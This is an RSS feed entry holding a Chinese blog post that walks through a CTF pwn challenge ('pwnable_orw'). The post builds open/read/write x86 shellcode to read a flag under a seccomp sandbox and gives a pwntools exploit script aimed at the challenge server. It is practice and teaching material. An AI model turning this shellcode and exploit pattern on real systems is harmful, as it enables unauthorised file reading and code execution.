<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>0110 0011 0111 1001 0110 0010 • Posts by &#34;shellcode&#34; category</title>
        <link>https://vvwwvv.cn</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Fri, 22 Sep 2023 17:08:15 +0800</pubDate>
        <lastBuildDate>Fri, 22 Sep 2023 17:08:15 +0800</lastBuildDate>
        <category>Java</category>
        <category>pwn</category>
        <category>Linux</category>
        <category>二进制</category>
        <category>Apache</category>
        <category>报错</category>
        <category>C++</category>
        <category>C语言</category>
        <category>windows</category>
        <category>渗透</category>
        <category>ret2csu</category>
        <category>how2heap</category>
        <category>fastbin.attack</category>
        <category>ctf</category>
        <category>系统调用</category>
        <category>rop</category>
        <category>nc</category>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/09/22/pwn/%E5%88%B7%E9%A2%98/BUUCTF/orw/</guid>
            <title>pwnable_orw（手写汇编之shellcode，沙盒机制）</title>
            <link>https://vvwwvv.cn/2023/09/22/pwn/%E5%88%B7%E9%A2%98/BUUCTF/orw/</link>
            <category>pwn</category>
            <pubDate>Fri, 22 Sep 2023 17:08:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;1查看程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1查看程序&#34;&gt;#&lt;/a&gt; 1. 查看程序&lt;/h1&gt;
&lt;p&gt;32 位程序，没有开启 NX，初步认为可以利用 &lt;code&gt;shellcode&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/23/pPTmrOe.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;ida 查看&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/23/pPTm6wd.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
看到有一个  &lt;code&gt;orw_seccomp()&lt;/code&gt; ， &lt;code&gt;seccomp函数&lt;/code&gt; 是一个沙盒机制&lt;/p&gt;
&lt;p&gt;进去查看（关于沙盒详情见文章 &lt;code&gt;沙盒机制&lt;/code&gt; ）&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/23/pPTmWfP.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;利用工具 &lt;code&gt;seccomp-tools&lt;/code&gt;  查看具体过滤情况，&lt;br /&gt;
使用命令 &lt;code&gt;seccomp-tools dump ./orw&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/23/pPTmaJx.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;看到我们可以使用  &lt;code&gt;open/read/write&lt;/code&gt;  函数，可以写入执行这几个的函数的 &lt;code&gt;shellcode&lt;/code&gt;  来读取 &lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 &lt;code&gt;open&lt;/code&gt;  打开 flag 文件&lt;/li&gt;
&lt;li&gt;利用 &lt;code&gt;read&lt;/code&gt;  读取 flag 到某一地址&lt;/li&gt;
&lt;li&gt;利用 &lt;code&gt;write&lt;/code&gt;  输出这个地址的 flag 即可&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;2shellcode-构造&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2shellcode-构造&#34;&gt;#&lt;/a&gt; 2.shellcode 构造&lt;/h1&gt;
&lt;p&gt;利用系统调用方式：&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/23/pPTuPKS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;1利用shellcraft构造&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1利用shellcraft构造&#34;&gt;#&lt;/a&gt; 1. 利用 shellcraft 构造&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shellcode&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;shellcraft&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shellcode&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;shellcraft&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;eax&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;esp&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#此处 eax 为 3（打开 0，1，2 标准输入，标准输出，标准错误）&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#read 函数的 fd 之所以是 3，是因为默认情况下，0,1,2 这三个句柄对应的是标准输入，标准输出，标准错误，系统进程默认会打开 0，1，2 这三个文件描述符。所以通常我们 open 的返回值是从 3 开始的（系统调用返回值会保存在 eax 中）&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shellcode&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;shellcraft&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;esp&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;asm&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;shellcode&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#记得要用 asm 转成汇编&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;2手动构造&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2手动构造&#34;&gt;#&lt;/a&gt; 2. 手动构造&lt;/h2&gt;
&lt;p&gt;1. 调用 open 打开 flag 文件：88&lt;/p&gt;
&lt;p&gt;调用函数为 &lt;code&gt;sys_open(const *path,0,0)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;push 0x0 #字符串是以\x00结尾
push 0x67616c66 #flag的ascill码，小端序（66 &amp;quot;f&amp;quot; ,6c &amp;quot;l&amp;quot; ,61 &amp;quot;a&amp;quot; ,67 &amp;quot;g&amp;quot;）
mov ebx,esp
xor    ecx,ecx
xor    edx,edx
mov  eax, 0x5
int     0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里解释为什么先要 &lt;code&gt;push 0x0&lt;/code&gt; 【后来发现，这里写错了，先 push 的 0，在栈上应该是高地址，flag 应该在低处，所以这里并没有起到作为终止符的作用，这里最应该是 &lt;code&gt;0flag&lt;/code&gt; 】&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/23/pPTl3y6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;2. 调用 read 读取 flag&lt;/p&gt;
&lt;p&gt;调用函数为 &lt;code&gt;read(0x3,esp,0x100)&lt;/code&gt; (0x3 为文件描述符 0,1,2，写入到 esp，这一部分 esp 没有进行调用不会被影响)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mov ebx,0x3
mov ecx,esp
mov edx, 0x100
mov eax,0x3
int     0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;3. 调用 write 将 flag 从上面写入的位置输出到屏幕&lt;/p&gt;
&lt;p&gt;调用的函数为 &lt;code&gt;write(0x1,esp,0x100)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mov ebx,0x1
mov ecx,esp
mov edx,0x100
mov eax, 0x4
int   0x80

&lt;/code&gt;&lt;/pre&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shellcode&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;asm&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; ;    ;    ;      ; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shellcode&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;asm&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shellcode&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;asm&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;只有这里最后一个不用加分号&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里就构造完毕 shellcode 了&lt;/p&gt;
&lt;h1 id=&#34;3exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3exp&#34;&gt;#&lt;/a&gt; 3.exp:&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#context.log_level = &#39;debug&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;os&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arch&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;i386&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#p=process(&#39;./orw&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#e=ELF(&#39;./&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;27810&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#shellcode = (shellcraft.open(&#34;./flag&#34;))&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#shellcode+=(shellcraft.read(&#39;eax&#39;,&#39;esp&#39;,100))&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#shellcode+=(shellcraft.write(1,&#39;esp&#39;,100))&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shellcode&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;push 0x0 ;push 0x67616c66 ;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax, 0x5;int 0x80;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shellcode&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;mov ebx,0x3;mov ecx,0x804A0A0;mov edx, 0x100;mov eax,0x3;int 0x80;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shellcode&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;mov ebx,0x1;mov ecx,0x804A0A0;mov edx,0x100;mov eax, 0x4;int 0x80&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;your shellcode:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#payload1=p32()+p32()+p32()+p32()&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#payload1=p64()+p64()+p64()+p64()&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#gdb.attach(p,&#34;b *&#34;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#gdb.attach(pid)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;asm&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;shellcode&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#p.recvuntil(&#34;&#34;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#payload2=p32()+p32()+p32()+p32()&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#payload2=p64()+p64()+p64()+p64()&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#p.sendline(payload2)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;本地仍然打不通，应该是环境问题&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/23/pPTY8OI.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
